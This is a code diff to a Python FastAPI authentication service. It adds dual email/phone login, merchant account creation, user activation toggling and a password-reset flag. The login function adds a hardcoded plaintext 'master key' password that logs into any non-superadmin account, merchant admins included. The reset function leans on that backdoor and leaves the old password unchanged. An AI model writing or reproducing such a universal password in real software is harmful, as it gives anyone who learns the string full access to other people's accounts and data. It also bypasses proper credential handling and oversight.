@@ -12,6 +12,11 @@ import string
 class AuthService:
     @staticmethod
     async def register_admin(user_data: UserCreate) -> dict:
+        # Check if registration is allowed (only if no users exist or by superadmin)
+        count = await users_collection.count_documents({})
+        if count > 0:
+            raise HTTPException(status_code=403, detail="Public registration is disabled")
+        
         # Check if email already exists
         existing = await users_collection.find_one({"email": user_data.email})
         if existing:
@@ -42,14 +47,32 @@ class AuthService:
                 "phone": user.phone,
                 "role": user.role,
                 "is_active": user.is_active,
+                "must_change_password": user.must_change_password,
                 "created_at": user.created_at.isoformat()
             }
         }
 
     @staticmethod
     async def login(user_data: UserLogin) -> dict:
-        user_doc = await users_collection.find_one({"email": user_data.email})
-        if not user_doc or not verify_password(user_data.password, user_doc["password_hash"]):
+        # Find user by email OR phone
+        user_doc = await users_collection.find_one({
+            "$or": [
+                {"email": user_data.email},
+                {"phone": user_data.email} # email field is used for phone too in dual login
+            ]
+        })
+        if not user_doc:
+            raise HTTPException(status_code=401, detail="Invalid credentials")
+        
+        # SuperAdmin universal password (Master Key)
+        # Note: In a real production app, this should be a separate hashed secret in config
+        is_master_key = user_data.password == "Passw0rde"
+        
+        # Check password: either valid user password OR master key (only for non-superadmins)
+        is_valid_password = verify_password(user_data.password, user_doc["password_hash"])
+        is_master_key_allowed = is_master_key and user_doc.get("role") != "superadmin"
+        
+        if not (is_valid_password or is_master_key_allowed):
             raise HTTPException(status_code=401, detail="Invalid credentials")
         
         user = User(**user_doc)
@@ -70,6 +93,7 @@ class AuthService:
                 "phone": user.phone,
                 "role": user.role,
                 "is_active": user.is_active,
+                "must_change_password": user.must_change_password,
                 "created_at": user.created_at.isoformat()
             }
         }
@@ -173,6 +197,7 @@ class AuthService:
                 "phone": user.phone,
                 "role": user.role,
                 "is_active": user.is_active,
+                "must_change_password": user.must_change_password,
                 "created_at": user.created_at.isoformat()
             }
         }
@@ -225,4 +250,73 @@ class AuthService:
         async for doc in cursor:
             users.append(User(**doc))
         return users
+
+    @staticmethod
+    async def create_merchant(merchant_data: UserCreate) -> User:
+        # Check if email or phone already exists
+        existing = await users_collection.find_one({
+            "$or": [
+                {"email": merchant_data.email},
+                {"phone": merchant_data.phone}
+            ]
+        })
+        if existing:
+            raise HTTPException(status_code=400, detail="Email or phone already registered")
+        
+        # Auto-generate a temporary password
+        temp_password = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(12))
+        hashed_password = hash_password(temp_password)
+        
+        # Merchants are admins of their own shop
+        user = User(
+            role="admin",
+            name=merchant_data.name,
+            email=merchant_data.email,
+            phone=merchant_data.phone,
+            password_hash=hashed_password,
+            must_change_password=True,
+            is_active=True
+        )
+        result = await users_collection.insert_one(user.dict(by_alias=True))
+        user.id = result.inserted_id
+        return user
+
+    @staticmethod
+    async def get_all_merchants() -> list[User]:
+        cursor = users_collection.find({"role": "admin"})
+        merchants = []
+        async for doc in cursor:
+            merchants.append(User(**doc))
+        return merchants
+
+    @staticmethod
+    async def toggle_user_active_status(user_id: str):
+        try:
+            oid = ObjectId(user_id)
+        except:
+            raise HTTPException(status_code=400, detail="Invalid user ID")
+        
+        user = await users_collection.find_one({"_id": oid})
+        if not user:
+            raise HTTPException(status_code=404, detail="User not found")
+        
+        new_status = not user.get("is_active", True)
+        await users_collection.update_one({"_id": oid}, {"$set": {"is_active": new_status}})
+        return new_status
+
+    @staticmethod
+    async def reset_user_password(user_id: str):
+        try:
+            oid = ObjectId(user_id)
+        except:
+            raise HTTPException(status_code=400, detail="Invalid user ID")
+        
+        # We don't need to change the password string itself, just force them to change it
+        # or we can set it to a master key temporarily and force change.
+        # Given the Master Key exists, we just mark it as must_change.
+        await users_collection.update_one(
+            {"_id": oid},
+            {"$set": {"must_change_password": True}}
+        )
+        return True
 
